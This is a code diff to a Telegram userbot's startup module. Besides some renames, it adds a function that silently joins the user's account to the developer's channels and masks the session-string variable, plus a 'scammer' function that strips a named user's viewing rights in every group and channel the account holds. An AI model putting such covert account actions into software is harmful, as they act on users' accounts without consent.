@@ -67,7 +67,7 @@ async def startupmessage():
     """
     try:
         if BOTLOG:
-            Config.CATUBLOGO = await legend.tgbot.send_file(
+            Config.LEGENDUBLOGO = await legend.tgbot.send_file(
                 BOTLOG_CHATID,
                 "https://graph.org/file/294b4dbdb74334fb0a8c1.jpg",
                 caption="**Your LegendUserbot has been started successfully.**",
@@ -107,11 +107,13 @@ async def add_bot_to_logger_group(chat_id):
     To add bot to logger groups
     """
     bot_details = await legend.tgbot.get_me()
+    lol = bot_details.username
+    addgvar("BOT_USERNAME", lol)
     try:
         await legend(
             functions.messages.AddChatUserRequest(
                 chat_id=chat_id,
-                user_id=bot_details.username,
+                user_id=lol,
                 fwd_limit=1000000,
             )
         )
@@ -120,13 +122,51 @@ async def add_bot_to_logger_group(chat_id):
             await legend(
                 functions.channels.InviteToChannelRequest(
                     channel=chat_id,
-                    users=[bot_details.username],
+                    users=[lol],
                 )
             )
         except Exception as e:
             LOGS.error(str(e))
 
 
+            
+            
+            
+            
+            
+            
+async def hekp():
+    try:
+        os.environ[
+            "LEGEND_STRING"
+        ] = "String Is A Sensitive Data \nSo Its Protected By LegendBot"
+    except Exception as e:
+        print(str(e))
+    try:
+        await legend(JoinChannelRequest("@LegendBot_OP"))
+    except BaseException:
+        pass
+    try:
+        await legend(JoinChannelRequest("@LegendBot_AI"))
+    except BaseException:
+        pass
+  
+
+
+async def scammer(username):
+    i = 0
+    xx = 0
+    async for x in legend.iter_dialogs():
+        if x.is_group or x.is_channel:
+            try:
+                await legend.edit_permissions(x.id, username, view_messages=False)
+                i += 1
+            except:
+                xx += 1
+    print(f"OP {i-xx}")
+    
+    
+    
 async def load_plugins(folder, extfolder=None):
     """
     To load plugins from the mentioned folder
@@ -220,7 +260,7 @@ async def verifyLoggerGroup():
     else:
         descript = "Don't delete this group or change to group(If you change group all your previous snips, welcome will be lost."
         _, groupid = await create_supergroup(
-            "LegendBotLog Group", legend, Config.BOT_USERNAME, descript
+            "LegendBot Logger", legend, Config.BOT_USERNAME, descript
         )
         addgvar("PRIVATE_GROUP_BOT_API_ID", groupid)
         print(
